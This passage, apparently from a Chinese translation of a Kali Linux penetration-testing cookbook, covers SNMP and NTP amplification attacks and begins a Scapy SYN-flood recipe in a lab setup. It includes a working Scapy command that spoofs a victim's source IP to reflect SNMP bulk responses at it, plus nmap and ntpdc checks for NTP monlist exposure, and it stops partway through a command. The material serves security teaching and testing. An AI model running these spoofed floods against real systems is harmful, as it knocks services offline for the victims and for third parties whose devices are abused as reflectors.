  \n要实际使用此命令进行攻击，源 IP 地址需要更改为目标系统的 IP 地址。这样做，我们应该能够将负载重定向到该受害者。这可以通过将 `IP src` 值更改为目标\
  \ IP 的字符串来实现：\n\n```python\n>>> send(IP(dst=\"172.16.36.134\",src=\"172.16.36.135\"\
  )/**\nUDP(sport=161,dport=161)/SNMP(PDU=SNMPbulk(max_repetitions=50,varbindlist=[SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1')),SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.19.1.3'))])),verbose=1,count=2)\n\
  ```\n\n发送了 2 个数据包。\n\n应该使用 `send()` 函数来发送这些伪造请求，因为预计本地接口上不会返回响应。要确认负载到达了目标系统，可以使用\
  \ `TCPdump` 入流量：\n\n```bash\nadmin@ubuntu: sudo tcpdump -i eth0 -vv src 172.16.36.134\n\
  tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes\n\
  13:32:14.210732 IP (tos 0x0, ttl 128, id 5944, offset 0, flags [+],\nproto UDP (17),\
  \ length 1500) 172.16.36.134.snmp > 172.16.36.135.snmp:\n[len1468<asnlen2150]\n\
  13:32:14.210732 IP (tos 0x0, ttl 128, id 5944, offset 148, flags [none],\nproto\
  \ UDP (17), length 702) 172.16.36.134 > 172.16.36.135: udp\n```\n\n\n\n\n\nSNMP\
  \ 放大攻击的有效性与 SNMP 查询响应的大小直接相关。此外，通过使用多个 SNMP 设备，可以增加攻击的威力。\n\n# NTP 放大 DoS 攻击\n\n\
  NTP 放大 DoS 攻击利用了网络时间协议（NTP）服务器，这些服务器会响应远程 `monlist` 请求。`monlist` 函数会返回所有与服务器交互过的设备列表，在某些情况下，列表条目多达\
  \ 600 条。攻击者可以伪造来自目标 IP 地址的请求，脆弱的服务器会为发送的每个请求返回非常大的响应。在本书编写时，这仍然是一个在大范围内使用的常用威胁。因此，我将仅演示如何测试\
  \ NTP 服务器以确定它们是否会响应远程 `monlist` 请求。大多数 NTP 服务都提供了补丁或修复来解决此问题，任何出现症状的设备都应该进行修复或下线。\n\
  \n### 准备工作\n\n要确定一个 NTP 服务器是否可以用于 NTP 放大攻击，你需要一个启用了 NTP 的设备。在提供的示例中，使用了安装了 Ubuntu\
  \ 来托管 NTP 服务。有关设置 Ubuntu 的更多信息，请参阅本书第 1 章“入门”中的*安装 Ubuntu Server*食谱。\n\n### 如何操作……\n\
  \n为了确定远程服务器是否正在运行 NTP 服务，可以使用 `nmap` 快速扫描 UDP 端口 `123`。可以使用 `-sU` 选项指定 UDP，然后使用\
  \ `-p` 选项指定端口：\n\n```\nroot@KaliLinux:~# nmap -sU 172.16.36.224 -p 123\nStarting\
  \ Nmap 6.25 ( http://nmap.org ) at 2014-02-24 18:12 EST\nNmap scan report for 172.16.36.224\n\
  Host is up (0.00068s latency).\nPORT STATE SERVICE\n123/udp open ntp\nMAC Address:\
  \ 00:0C:29:09:C3:79 (VMware)\nNmap done: 1 IP address (1 host up) scanned in 0.10\
  \ seconds\n```\n\n如果远程服务器上运行着 NTP 服务，扫描结果将返回 `open`（开启）状态。\n\nKali Linux 默认安装的另一个工具也可以用于判断\
  \ NTP 服务是否可以用于放大攻击。可以使用 `ntpdc` 工具尝试对远程服务执行 `monlist` 命令：\n\n```\nroot@KaliLinux:~#\
  \ ntpdc -n -c monlist 172.16.36.224\n172.16.36.224: timed out, nothing received\n\
  Request timed out\n```\n\n理想情况下，我们希望看到的是没有返回任何响应。在提供的第一个示例中，请求超时且没有收到任何输出。这表明服务器是不脆弱的，`monlist`\
  \ 命令只能在本地执行：\n\n```\nroot@KaliLinux:~# ntpdc -c monlist 172.16.36.3\nremote address\
  \ port local address count m ver rstr avgint lstint\nhost.crossing.com 123 172.16.36.3\
  \ 18 4 4 1d0 351\ngrub.ca.us.roller.o 123 172.16.36.3 17 4 4 1d0 37 35\nva-time.utility.o\
  \ 123 172.16.36.3 17 4 4 1d0 37 59\ncheezpuff.meatball.n 123 172.16.36.3 17 4 4\
  \ 1d0 38 62\npwnbox.lizard.com 123 172.16.36.3 35 4 4 5d0 65 51\n```\n\n或者，如果返回了一系列的主机和连接元数据，则远程服务器可能被用于放大攻击。每当有新主机与服务器交互时，该列表就会添加一个新条目，响应的大小以及潜在的负载也会随之增大。\n\
  \n### 工作原理……\n\n放大攻击通过利用第三方设备或多个设备，利用网络流量淹没目标来实现。对于大多数放大攻击，以下两个条件是的：\n\n- 用于执行攻击的协议不验证请求源\n\
  - 所用网络函数的响应应远大于用于触发该响应的请求\n\nNTP 放大攻击的有效性与 NTP `monlist` 查询响应的大小直接相关。此外，通过使用多个脆弱的\
  \ NTP 服务，可以增加攻击的威力。\n\n### SYN 洪水 DoS 攻击\n\nSYN 洪水 DoS 攻击是一种资源消耗攻击。它通过向与目标服务相关的远程端口发送大量的\
  \ TCP `SYN` 请求来实现。对于目标服务收到的每个初始 `SYN` 数据包，它将发送一个 `SYN+ACK` 数据包并保持连接开启，等待启动客户端发送的最终\
  \ `ACK` 数据包。通过用这些半打开请求过载目标，攻击者可以使服务无法响应。\n\n### 准备工作\n\n要使用 `Scapy` 对目标进行全 SYN 洪水，你需要一个运行基于\
  \ TCP 网络服务的远程系统。在提供的示例中，使用了 `Metasploitable2` 实例来执行此任务。有关设置 Metasploitable2 的更多信息，请参阅本书第\
  \ 1 章“入门”中的*安装 Metasploitable2*食谱。此外，本节还需要使用 `VIM` 或 `Nano` 等文本编辑器将脚本写入文件系统。有关编写脚本的更多信息，请请参阅本书第\
  \ 1 章“入门”中的*使用文本编辑器 (VIM 和 Nano)*食谱。\n\n### 如何操作……\n\n要使用 `Scapy` 执行 SYN 洪水，我们需要首先向与目标服务相关的端口发送\
  \ TCP `SYN` 请求。要向任何给定端口发送 TCP `SYN` 请求，我们必须首先构建该请求的层级。我们需要构建的第一层是 IP 层：\n\n```\n\
  root@KaliLinux:~# scapy\nWelcome to Scapy (2.2.0)\n>>> i = IP()\n>>> i.display()\n\
  ###[ IP ]###\nversion= 4\nihl= None\ntos= 0x0\nlen= None\nid= 1\nflags=\nfrag= 0\n\
  ttl= 64\nproto= ip\nchksum= None\nsrc= 127.0.0.1\ndst= 127.0.0.1\n>>> i.dst = \"\
